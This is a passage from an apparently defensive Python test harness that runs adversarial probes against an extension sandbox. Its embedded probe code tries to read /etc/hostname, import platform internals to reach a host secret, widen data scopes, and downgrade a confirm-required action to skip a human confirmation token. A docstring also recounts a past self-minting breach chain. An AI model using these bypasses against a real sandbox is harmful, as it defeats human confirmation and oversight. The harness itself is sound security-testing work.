            f"{dunder_rejected}; {len(candidates)} mint/host/secret/token/"
            f"broker-named globals probed end-to-end as mint candidates, "
            f"all refused ({'; '.join(refused)})")

        return True, "no self-mint traversal path. " + " ".join(evidence_parts)
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_scope_escalation() -> tuple[bool, str]:
    """Widen data scopes through the public ctx API at runtime.

    A real author cannot name ``ctx._manifest`` (the import scan rejects
    private-attribute access), so this probes what they CAN do: mutate
    the public capability views (``ctx.scopes`` is a frozenset —
    immutable; the only mutation angle is gone by construction) and then
    read an undeclared scope. Enforcement reads the deep-frozen
    manifest, never extension-reachable state.

    NOTE: ``PermissionError`` is not in the extension exec builtins, so
    the probe matches the refusal by name in ``repr()`` — the same
    confinement a real author faces.
    """
    ext = _mkext(
        _base_manifest(),
        "def _evil(ctx):\n"
        "    try:\n"
        "        ctx.scopes.add('profile:read')\n"
        "        mutation = 'applied?!'\n"
        "    except Exception as e:\n"
        "        mutation = 'BLOCKED:' + repr(e)[:80]\n"
        "    try:\n"
        "        ctx.data('profile:read')\n"
        "        return {'escalated': True, 'mutation': mutation}\n"
        "    except Exception as e:\n"
        "        r = repr(e)\n"
        "        if 'PermissionError' in r:\n"
        "            return {'escalated': False, 'mutation': mutation}\n"
        "        return {'escalated': 'error',\n"
        "                'detail': r[:160]}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            result = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        except Exception as exc:
            raise AttackHarnessError(
                f"escalation probe crashed ({type(exc).__name__}): "
                f"{exc}") from exc
        if not isinstance(result, dict) or "escalated" not in result:
            raise AttackHarnessError(
                f"escalation probe returned uninterpretable result: "
                f"{result!r}")
        if result["escalated"] is True:
            return False, "scope escalation via runtime mutation succeeded"
        if result["escalated"] == "error":
            raise AttackHarnessError(
                "escalation probe hit unexpected "
                f"{result.get('detail')} (expected a PermissionError "
                f"refusal)")
        return True, f"frozen manifest held: {result}"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_kind_downgrade() -> tuple[bool, str]:
    """Downgrade a confirm-required action's kind to skip the token gate.

    ``ctx.action_kinds`` returns an immutable snapshot dict — mutating
    the snapshot must not affect enforcement, which reads the
    deep-frozen manifest. The probe mutates the snapshot, then runs the
    confirm-required action with no token.
    """
    manifest = _base_manifest(actions=[
        {"id": "do-evil", "kind": "read", "description": "fixture"},
        {"id": "send-it", "kind": "confirm-required",
         "confirm_required": True, "description": "fixture"},
    ])
    code = (
        "def _evil(ctx):\n"
        "    try:\n"
        "        kinds = ctx.action_kinds\n"
        "        kinds['send-it'] = 'read'\n"
        "        return {'mutation': 'snapshot-mutated'}\n"
        "    except Exception as e:\n"
        "        return {'mutation': 'BLOCKED:' + repr(e)[:80]}\n"
        "ACTIONS = {'do-evil': _evil,\n"
        "           'send-it': lambda ctx, **kw: {'sent': True}}\n"
    )
    ext = _mkext(manifest, code)
    host = _host()
    try:
        loaded = _load(host, ext)
        try:
            probe = host.run_extension_action(loaded.ext_id, "do-evil")["result"]
        except Exception as exc:
            raise AttackHarnessError(
                f"downgrade probe crashed ({type(exc).__name__}): "
                f"{exc}") from exc
        if not isinstance(probe, dict):
            raise AttackHarnessError(
                f"downgrade probe returned uninterpretable result: "
                f"{probe!r}")
        try:
            host.run_extension_action(loaded.ext_id, "send-it")
        except PermissionError:
            return True, ("frozen kind held; token still required "
                          f"(probe: {probe})")
        except Exception as exc:
            raise AttackHarnessError(
                "tokenless send-it run failed with unexpected "
                f"{type(exc).__name__} (expected a PermissionError "
                f"refusal): {exc}") from exc
        return False, "kind downgrade skipped confirmation gate"
    finally:
        shutil.rmtree(ext, ignore_errors=True)


def attempt_platform_import() -> tuple[bool, str]:
    """Import this platform's own package to reach _host_secret()."""
    return _attempt_load_rejection(
        "platform-internals-import",
        "import initiatives.i11.sandbox.host as _h  # noqa\n"
        "ACTIONS = {'do-evil': lambda ctx, **kw: "
        "{'secret': _h._host_secret()}}\n",
    )


def attempt_stdlib_fs_bypass() -> tuple[bool, str]:
    """Use pathlib/os/open directly to read outside the fs sandbox."""
    return _attempt_load_rejection(
        "stdlib-fs-bypass",
        "import pathlib  # noqa\n"
        "def _evil(ctx):\n"
        "    return {'etc': pathlib.Path('/etc/hostname').exists()}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )


def attempt_bare_open() -> tuple[bool, str]:
    """Use bare open() to read a file outside the sandbox."""
    return _attempt_load_rejection(
        "bare-open-bypass",
        "def _evil(ctx):\n"
        "    with open('/etc/hostname') as fh:\n"
        "        return {'etc': fh.read(8)}\n"
        "ACTIONS = {'do-evil': _evil}\n",
    )


# ---------------------------------------------------------------------------
# Canary (negative control): the harness MUST be able to say "breach"
# ---------------------------------------------------------------------------

def _canary_plumbing_control() -> tuple[bool, str]:
    """CANARY / NEGATIVE CONTROL (harness self-test, NOT a live exploit).

    Returns ``blocked=False`` BY CONSTRUCTION. Its job is to prove the
    suite runner can report a non-HOLD verdict — that a green
    ``run_adversarial_suite()`` is evidence, not theater. It exercises
    no platform code and proves nothing about the platform.

    The proof that the harness detects REAL failure is elsewhere and
    load-bearing: the C2 regression tests (a broken
    ``Host.load_extension`` and a crashing attack function both flip the
    verdict off HOLD), and the retired introspection canary's history —
    ``attempt_self_mint_introspection`` demonstrated a REAL end-to-end
    self-mint breach (``ctx._broker`` → ``ctx._broker._token`` →
    ``__globals__['_BROKER_HOSTS'][token]`` → ``confirmations.mint`` →
    confirm-required action executed, ``{'self_minted_ok': True}``, no
    human) until the sandbox rework closed the path. When the rework
    landed, the canary flipped to ``blocked=True`` — the designed
    signal — and its vector class moved into ``attempt_ctx_host_traversal``
    (V3/V4), which probes the same vectors for real instead of probing a
    dead attribute path. Do NOT "fix" this control to return
    ``blocked=True``: a canary that cannot say "breach" is a dead
    control, and ``run_canary_suite`` errors loudly if it ever does.
    """
    return False, ("CANARY (expected breach): synthetic harness self-test "
                   "reporting breach by construction — proves the runner "
                   "can say 'breach'. Not an exploit; exercises no "
                   "platform code.")


ALL_ATTACKS = [
    ("self-confirm-without-token", attempt_self_confirm),
    ("forged-confirmation-token", attempt_forged_token),
    ("exfiltrate-undeclared-host", attempt_exfiltrate_undeclared_host),
    ("filesystem-escape", attempt_fs_escape),
    ("banned-core-import", attempt_banned_import),
    ("platform-internals-import", attempt_platform_import),
    ("stdlib-fs-bypass", attempt_stdlib_fs_bypass),
    ("bare-open-bypass", attempt_bare_open),
    ("ctx-host-traversal-self-mint", attempt_ctx_host_traversal),
    ("scope-escalation", attempt_scope_escalation),
    ("kind-downgrade", attempt_kind_downgrade),
    ("audit-tamper", attempt_audit_tamper),
    ("post-load-manifest-mutation", attempt_manifest_mutation),
    ("undeclared-action", attempt_undeclared_action),
]

#: Negative controls: they prove the harness can report failure. Never
#: part of the HOLD verdict.
CANARY_ATTACKS = [
    ("canary-breach-plumbing", _canary_plumbing_control),
]


def _run_attack_list(attacks: list) -> tuple[list[dict[str, Any]], list[str]]:
    results = []
    for name, fn in attacks:
        try:
            outcome = fn()
        except AttackHarnessError as exc:
            results.append({"attack": name, "blocked": False,
                            "evidence": f"HARNESS FAILURE (fail loud): {exc}",
                            "harness_error": True})
            continue
        except Exception as exc:  # noqa: BLE001 - recorded, never swallowed
            results.append({"attack": name, "blocked": False,
                            "evidence": f"UNEXPECTED CRASH (fail loud): "
                                        f"{type(exc).__name__}: {exc}",
                            "harness_error": True})
            continue
        if (not isinstance(outcome, tuple) or len(outcome) != 2
                or not isinstance(outcome[0], bool)
                or not isinstance(outcome[1], str)):
            results.append({"attack": name, "blocked": False,
                            "evidence": f"HARNESS FAILURE (fail loud): "
                                        f"malformed result {outcome!r}",
                            "harness_error": True})
            continue
        blocked, evidence = outcome
        results.append({"attack": name, "blocked": blocked,
                        "evidence": evidence, "harness_error": False})
    breached = [r["attack"] for r in results if not r["blocked"]]
    return results, breached


def run_adversarial_suite() -> dict[str, Any]:
    """Run every attack in ALL_ATTACKS. ``blocked: False`` anywhere — for
    a real breach OR a harness failure — is an incident: the verdict flips
    off HOLD."""
    results, breached = _run_attack_list(ALL_ATTACKS)
    harness_errors = [r["attack"] for r in results if r["harness_error"]]
    return {
        "attacks": len(results),
        "blocked": len(results) - len(breached),
        "breached": breached,
        "harness_errors": harness_errors,
        "results": results,
        "verdict": "HOLD" if not breached else "BREACH — DO NOT SHIP",
    }


def run_canary_suite() -> dict[str, Any]:
    """Run the negative-control attacks separately from the HOLD verdict.

    The canary MUST report breach: that is the proof the harness can say
    "breach". If the canary ever reports ``blocked=True`` (or crashes),
    the failure path itself is broken — this function raises
    ``AttackHarnessError`` loudly instead of reporting any green verdict.
    """
    results, breached = _run_attack_list(CANARY_ATTACKS)
    harness_errors = [r["attack"] for r in results if r["harness_error"]]
    if harness_errors:
        raise AttackHarnessError(
            f"canary harness failure (fail loud): {harness_errors}: "
            f"{results}")
    if not breached:
        raise AttackHarnessError(
            "CANARY HELD: the negative control did not report breach — "
            "the harness failure path is broken; refusing to report green")
    return {
        "attacks": len(results),
        "breached": breached,
        "results": results,
        "note": ("canary/negative-control: breach is the EXPECTED outcome "
                 "(it proves the harness can report failure); a held "
                 "canary raises instead of reporting green"),
        "verdict": "CANARY BREACH (expected — harness self-test)",
    }
